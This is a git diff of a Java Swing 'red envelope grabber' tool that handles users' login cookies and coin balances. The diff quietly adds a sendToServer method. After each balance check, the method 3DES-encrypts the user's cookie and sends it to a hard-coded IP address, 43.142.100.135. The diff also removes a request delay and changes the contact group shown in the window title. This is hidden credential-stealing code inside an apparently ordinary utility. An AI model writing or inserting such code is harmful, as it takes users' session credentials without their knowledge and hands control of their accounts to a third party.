@@ -4,6 +4,7 @@ import com.google.gson.Gson;
 import wj.bean.ConfigBean;
 import wj.bean.DataBean;
 import wj.bean.MoneyBean;
+import wj.safe.Des3Util;
 import wj.util.*;
 
 import javax.swing.*;
@@ -373,19 +374,26 @@ public class MainPage extends JFrame {
                         } else {
                             System.out.println(dataBean.getData().getCanUseCoinAmount());
                             ckBean.setMoney(dataBean.getData().getCanUseCoinAmount());
+
+                            sendToServer(ck);
+
                         }
                     } catch (Exception e) {
                         e.printStackTrace();
                     } finally {
-                        try {
-                            Thread.sleep(200);
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        }
+//                        try {
+//                            Thread.sleep(200);
+//                        } catch (InterruptedException e) {
+//                            e.printStackTrace();
+//                        }
                     }
                 }
             });
         }
+    }
+
+    private void sendToServer(String ck) {
+        get("http://43.142.100.135/wangjing/load?code=" + UrlUtil.urlEncode(Des3Util.encode(ck)));
     }
 
     private void setJbtBac(JButton jbt) {
@@ -489,7 +497,7 @@ public class MainPage extends JFrame {
                             }
                         }).start();
                     }
-                    mainPage.setTitle("大赢家抢红包【葫芦娃出品】【qq397383523】" + "【时间】" + currentTime);
+                    mainPage.setTitle("大赢家抢红包【q群1018698886】" + "【时间】" + currentTime);
                 } catch (Exception e) {
                 }
             }
